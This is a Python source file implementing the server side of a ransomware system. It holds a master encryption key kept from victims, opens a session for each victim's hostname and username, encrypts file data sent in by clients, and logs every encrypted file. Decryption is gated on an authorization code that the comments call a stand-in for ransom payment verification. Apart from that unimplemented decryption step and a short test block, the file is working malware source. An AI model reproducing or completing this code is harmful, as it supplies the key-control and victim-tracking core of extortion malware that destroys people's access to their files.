import base64
import json
import time
from pathlib import Path
from cryptography.fernet import Fernet
import os


class RansomwareServer:
    """
    Server-side ransomware controller that handles all encryption/decryption.
    Encryption keys never leave the server.
    Pure business logic - no networking concerns.
    """
    
    def __init__(self, data_directory="ransomware_server_data"):
        self.data_directory = Path(data_directory)
        self.data_directory.mkdir(exist_ok=True)
        
        # Generate master encryption key (never shared with client)
        self.master_key = Fernet.generate_key()
        self.fernet = Fernet(self.master_key)
        
        # Logging and tracking
        self.encrypted_files_log = {}
        self.active_sessions = {}
        
        # Save key to secure file for persistence
        self.key_file = self.data_directory / "master.key"
        self._save_master_key()
        
        print(f"[+] Ransomware Server initialized with secure key storage")
    
    def _save_master_key(self):
        """Save master key to secure file (in real scenario, this would be heavily protected)."""
        try:
            with open(self.key_file, 'wb') as f:
                f.write(self.master_key)
        except Exception as e:
            print(f"Warning: Could not save master key: {e}")
    
    def _load_master_key(self):
        """Load master key from secure file."""
        try:
            if self.key_file.exists():
                with open(self.key_file, 'rb') as f:
                    self.master_key = f.read()
                    self.fernet = Fernet(self.master_key)
                return True
        except Exception as e:
            print(f"Warning: Could not load master key: {e}")
        return False
    
    def create_session(self, client_info):
        """
        Create a new ransomware session for a client.
        
        Args:
            client_info: Dictionary with client system information
        
        Returns:
            Tuple (session_id: str, session_data: dict)
        """
        session_id = f"session_{int(time.time())}_{hash(str(client_info)) % 10000}"
        
        session_data = {
            'session_id': session_id,
            'client_info': client_info,
            'created_at': time.time(),
            'encrypted_files': [],
            'status': 'active'
        }
        
        self.active_sessions[session_id] = session_data
        
        return session_id, session_data
    
    def encrypt_file_data(self, file_data, file_info, session_id):
        """
        Encrypt file data using server-managed key.
        
        Args:
            file_data: Raw file data (bytes)
            file_info: File metadata dictionary
            session_id: Client session ID
        
        Returns:
            Tuple (success: bool, encrypted_data_hex: str, file_id: str, message: str)
        """
        try:
            # Encrypt with server's master key
            encrypted_data = self.fernet.encrypt(file_data)
            
            # Generate unique file ID
            file_id = f"{session_id}_file_{int(time.time())}_{hash(file_info['original_path']) % 10000}"
            
            # Log the encryption
            encryption_record = {
                'file_id': file_id,
                'session_id': session_id,
                'original_path': file_info['original_path'],
                'original_size': file_info['file_size'],
                'encrypted_size': len(encrypted_data),
                'encrypted_at': time.time(),
                'filename': file_info['filename']
            }
            
            self.encrypted_files_log[file_id] = encryption_record
            
            # Update session record
            if session_id in self.active_sessions:
                self.active_sessions[session_id]['encrypted_files'].append(file_id)
            
            return True, encrypted_data.hex(), file_id, f"File encrypted successfully with ID: {file_id}"
            
        except Exception as e:
            return False, None, None, f"Server encryption failed: {str(e)}"
    
    def encrypt_files_batch(self, files_data, session_id):
        """
        Encrypt multiple files in batch.
        
        Args:
            files_data: List of dictionaries with file_data and file_info
            session_id: Client session ID
        
        Returns:
            List of encryption results
        """
        results = []
        
        for file_item in files_data:
            file_data = file_item['file_data']
            file_info = file_item['file_info']
            
            success, encrypted_hex, file_id, message = self.encrypt_file_data(
                file_data, file_info, session_id
            )
            
            result = {
                'success': success,
                'original_path': file_info['original_path'],
                'file_id': file_id,
                'message': message
            }
            
            if success:
                result['encrypted_data'] = encrypted_hex
            else:
                result['error'] = message
            
            results.append(result)
        
        return results
    
    def decrypt_file_data(self, file_id, authorization_code=None):
        """
        Decrypt file data using server-managed key.
        Only available with proper authorization.
        
        Args:
            file_id: Unique file identifier
            authorization_code: Authorization code (simulates payment verification)
        
        Returns:
            Tuple (success: bool, decrypted_data: bytes, message: str)
        """
        try:
            # Check if file exists in log
            if file_id not in self.encrypted_files_log:
                return False, None, f"File ID {file_id} not found in encryption log"
            
            # In real ransomware, this would verify payment
            # For now, we'll simulate authorization check
            if authorization_code != "AUTHORIZED_DECRYPT":
                return False, None, f"Unauthorized decryption attempt for file {file_id}"
            
            # This is where encrypted data would be retrieved
            # In a real scenario, encrypted data would be stored server-side
            return False, None, "Decryption requires payment verification (not implemented for safety)"
            
        except Exception as e:
            return False, None, f"Server decryption failed: {str(e)}"
    
    def get_session_info(self, session_id):
        """Get information about a specific session."""
        if session_id in self.active_sessions:
            session = self.active_sessions[session_id].copy()
            
            # Add encryption statistics
            session['total_encrypted_files'] = len(session['encrypted_files'])
            session['encrypted_file_details'] = []
            
            for file_id in session['encrypted_files']:
                if file_id in self.encrypted_files_log:
                    file_info = self.encrypted_files_log[file_id]
                    session['encrypted_file_details'].append({
                        'file_id': file_id,
                        'original_path': file_info['original_path'],
                        'filename': file_info['filename'],
                        'size': file_info['original_size'],
                        'encrypted_at': file_info['encrypted_at']
                    })
            
            return session
        else:
            return {"error": f"Session {session_id} not found"}
    
    def get_server_statistics(self):
        """Get comprehensive server statistics."""
        total_sessions = len(self.active_sessions)
        total_encrypted_files = len(self.encrypted_files_log)
        
        # Calculate total data encrypted
        total_original_size = sum(
            record['original_size'] for record in self.encrypted_files_log.values()
        )
        total_encrypted_size = sum(
            record['encrypted_size'] for record in self.encrypted_files_log.values()
        )
        
        stats = {
            'server_status': 'Active',
            'master_key_status': 'Secured',
            'total_sessions': total_sessions,
            'total_encrypted_files': total_encrypted_files,
            'total_original_data_bytes': total_original_size,
            'total_encrypted_data_bytes': total_encrypted_size,
            'active_sessions': list(self.active_sessions.keys()),
            'recent_encryptions': []
        }
        
        # Add recent encryption details (last 10)
        recent_files = sorted(
            self.encrypted_files_log.values(),
            key=lambda x: x['encrypted_at'],
            reverse=True
        )[:10]
        
        for file_record in recent_files:
            stats['recent_encryptions'].append({
                'file_id': file_record['file_id'],
                'filename': file_record['filename'],
                'session_id': file_record['session_id'],
                'size': file_record['original_size'],
                'encrypted_at': file_record['encrypted_at']
            })
        
        return stats
    
    def list_all_sessions(self):
        """List all active sessions with basic info."""
        sessions_summary = []
        
        for session_id, session_data in self.active_sessions.items():
            summary = {
                'session_id': session_id,
                'created_at': session_data['created_at'],
                'client_hostname': session_data['client_info'].get('hostname', 'Unknown'),
                'client_username': session_data['client_info'].get('username', 'Unknown'),
                'encrypted_files_count': len(session_data['encrypted_files']),
                'status': session_data['status']
            }
            sessions_summary.append(summary)
        
        return sessions_summary
    
    def terminate_session(self, session_id):
        """Terminate a ransomware session."""
        if session_id in self.active_sessions:
            self.active_sessions[session_id]['status'] = 'terminated'
            self.active_sessions[session_id]['terminated_at'] = time.time()
            return True, f"Session {session_id} terminated"
        else:
            return False, f"Session {session_id} not found"
    
    def backup_encryption_log(self):
        """Backup encryption log to file."""
        try:
            backup_file = self.data_directory / f"encryption_log_backup_{int(time.time())}.json"
            
            backup_data = {
                'timestamp': time.time(),
                'total_files': len(self.encrypted_files_log),
                'sessions': self.active_sessions,
                'encrypted_files': self.encrypted_files_log
            }
            
            with open(backup_file, 'w') as f:
                json.dump(backup_data, f, indent=2)
            
            return True, f"Backup saved to {backup_file}"
            
        except Exception as e:
            return False, f"Backup failed: {str(e)}"


def create_ransomware_server(data_directory="ransomware_server_data"):
    """Factory function to create a RansomwareServer instance."""
    return RansomwareServer(data_directory)


# Example usage and testing
if __name__ == "__main__":
    # This section is for testing purposes only
    server = create_ransomware_server()
    
    print("Ransomware Server initialized")
    
    # Test session creation
    client_info = {"hostname": "test-pc", "username": "testuser"}
    session_id, session_data = server.create_session(client_info)
    print(f"Created session: {session_id}")
    
    # Test statistics
    stats = server.get_server_statistics()
    print("Server stats:", json.dumps(stats, indent=2))